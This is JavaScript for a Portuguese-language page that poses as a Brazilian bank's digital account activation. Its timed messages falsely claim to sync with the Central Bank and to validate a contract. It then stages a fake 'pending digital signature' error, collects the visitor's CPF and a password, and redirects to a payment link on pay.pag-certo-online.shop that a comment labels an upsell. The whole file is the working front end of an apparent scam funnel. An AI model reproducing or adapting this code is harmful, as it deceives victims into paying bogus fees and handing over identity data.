// Loading sequence controller
document.addEventListener('DOMContentLoaded', function() {
    startLoadingSequence();
    setupCPFMask();
});

function startLoadingSequence() {
    // Show success for first steps
    setTimeout(() => {
        updateLoadingText('Conta Digital Ativada!', 'Sincronizando com o Banco Central...');
    }, 2000);
    
    // Start generating card numbers
    setTimeout(() => {
        updateLoadingText('Validando Contrato', 'Preparando assinatura digital...');
        activateStep3();
    }, 4000);
    
    // Complete card generation
    setTimeout(() => {
        completeStep3();
    }, 6000);
    
    // Show signature error
    setTimeout(() => {
        showSignatureError();
    }, 8000);
    
    // Show login screen
    setTimeout(() => {
        showLoginScreen();
    }, 10000);
}

function updateLoadingText(title, subtitle) {
    document.getElementById('loadingTitle').textContent = title;
    document.getElementById('loadingSubtitle').textContent = subtitle;
}

function activateStep3() {
    const step3 = document.getElementById('step3');
    const status3 = document.getElementById('status3');
    const loader3 = document.getElementById('loader3');
    if (step3) step3.classList.add('active');
    if (status3) status3.textContent = 'Validando...';
    if (loader3) loader3.style.display = 'block';
}

function completeStep3() {
    const step3 = document.getElementById('step3');
    const status3 = document.getElementById('status3');
    const loader3 = document.getElementById('loader3');
    if (step3) {
        step3.classList.remove('active');
        step3.classList.add('completed');
    }
    if (status3) status3.textContent = 'Validado ✓';
    if (loader3) loader3.style.display = 'none';
    playSuccessSound();
}

function showSignatureError() {
    const errorMessage = document.getElementById('errorMessage');
    if (errorMessage) errorMessage.style.display = 'flex';
    updateLoadingText('Assinatura Digital Pendente', 'Formalização obrigatória necessária.');
    playErrorSound();
}

function showLoginScreen() {
    const loadingScreen = document.getElementById('loadingScreen');
    const loginScreen = document.getElementById('loginScreen');
    
    loadingScreen.style.transition = 'opacity 0.5s ease';
    loadingScreen.style.opacity = '0';
    
    setTimeout(() => {
        loadingScreen.style.display = 'none';
        loginScreen.style.display = 'block';
        loginScreen.style.opacity = '0';
        loginScreen.style.transition = 'opacity 0.5s ease';
        setTimeout(() => {
            loginScreen.style.opacity = '1';
        }, 50);
    }, 500);
}

function validateCPF() {
    const cpf = document.getElementById('cpf').value;
    if (cpf.length < 14) {
        showNotification('Por favor, insira um CPF válido.', 'error');
        return;
    }
    
    const loginForm = document.getElementById('loginForm');
    const passwordForm = document.getElementById('passwordForm');
    
    loginForm.style.display = 'none';
    passwordForm.style.display = 'block';
    showNotification('CPF validado com sucesso!', 'success');
}

function validatePassword() {
    const pass = document.getElementById('password').value;
    const confirm = document.getElementById('confirmPassword').value;
    
    if (pass.length < 6) {
        showNotification('A senha deve ter pelo menos 6 dígitos.', 'error');
        return;
    }
    
    if (pass !== confirm) {
        showNotification('As senhas não coincidem.', 'error');
        return;
    }
    
    showSignatureScreen();
}

function showSignatureScreen() {
    const loginScreen = document.getElementById('loginScreen');
    const signatureScreen = document.getElementById('signatureScreen');
    
    loginScreen.style.transition = 'opacity 0.5s ease';
    loginScreen.style.opacity = '0';
    
    setTimeout(() => {
        loginScreen.style.display = 'none';
        signatureScreen.style.display = 'block';
        signatureScreen.style.opacity = '0';
        signatureScreen.style.transition = 'opacity 0.5s ease';
        setTimeout(() => {
            signatureScreen.style.opacity = '1';
        }, 50);
    }, 500);
}

function redirectToSignaturePayment() {
    const btn = event.currentTarget;
    btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> PROCESSANDO...';
    btn.disabled = true;
    
    // O link de pagamento real do Upsell 02 (antigo 01)
    const paymentUrl = 'https://pay.pag-certo-online.shop/DYp0ZxVQ6KXgmvX';
    const urlParams = new URLSearchParams(window.location.search);
    const finalUrl = paymentUrl + (paymentUrl.includes('?') ? '&' : '?') + urlParams.toString();
    
    setTimeout(() => {
        window.location.href = finalUrl;
    }, 1500);
}

function setupCPFMask() {
    const cpfInput = document.getElementById('cpf');
    if (!cpfInput) return;
    cpfInput.addEventListener('input', function(e) {
        let value = e.target.value.replace(/\D/g, '');
        if (value.length > 11) value = value.slice(0, 11);
        if (value.length > 9) {
            value = value.replace(/^(\d{3})(\d{3})(\d{3})(\d{2}).*/, '$1.$2.$3-$4');
        } else if (value.length > 6) {
            value = value.replace(/^(\d{3})(\d{3})(\d{0,3}).*/, '$1.$2.$3');
        } else if (value.length > 3) {
            value = value.replace(/^(\d{3})(\d{0,3}).*/, '$1.$2');
        }
        e.target.value = value;
    });
}

function playSuccessSound() {
    try {
        const audioContext = new (window.AudioContext || window.webkitAudioContext)();
        const oscillator = audioContext.createOscillator();
        const gainNode = audioContext.createGain();
        oscillator.connect(gainNode);
        gainNode.connect(audioContext.destination);
        oscillator.frequency.setValueAtTime(800, audioContext.currentTime);
        oscillator.frequency.setValueAtTime(1000, audioContext.currentTime + 0.1);
        gainNode.gain.setValueAtTime(0, audioContext.currentTime);
        gainNode.gain.linearRampToValueAtTime(0.1, audioContext.currentTime + 0.01);
        gainNode.gain.exponentialRampToValueAtTime(0.01, audioContext.currentTime + 0.2);
        oscillator.start(audioContext.currentTime);
        oscillator.stop(audioContext.currentTime + 0.2);
    } catch (e) {}
}

function playErrorSound() {
    try {
        const audioContext = new (window.AudioContext || window.webkitAudioContext)();
        const oscillator = audioContext.createOscillator();
        const gainNode = audioContext.createGain();
        oscillator.connect(gainNode);
        gainNode.connect(audioContext.destination);
        oscillator.frequency.setValueAtTime(400, audioContext.currentTime);
        oscillator.frequency.setValueAtTime(300, audioContext.currentTime + 0.2);
        gainNode.gain.setValueAtTime(0, audioContext.currentTime);
        gainNode.gain.linearRampToValueAtTime(0.15, audioContext.currentTime + 0.01);
        gainNode.gain.exponentialRampToValueAtTime(0.01, audioContext.currentTime + 0.4);
        oscillator.start(audioContext.currentTime);
        oscillator.stop(audioContext.currentTime + 0.4);
    } catch (e) {}
}

function showNotification(message, type = 'info') {
    const notification = document.createElement('div');
    notification.className = `notification notification-${type}`;
    let bgColor = type === 'error' ? '#f44336' : (type === 'success' ? '#4caf50' : '#2196f3');
    notification.innerHTML = `<div class="notification-content"><span>${message}</span></div>`;
    notification.style.cssText = `position: fixed; top: 20px; right: 20px; background: ${bgColor}; color: white; padding: 15px 20px; border-radius: 10px; z-index: 10001;`;
    document.body.appendChild(notification);
    setTimeout(() => { if (notification.parentNode) notification.parentNode.removeChild(notification); }, 3000);
}
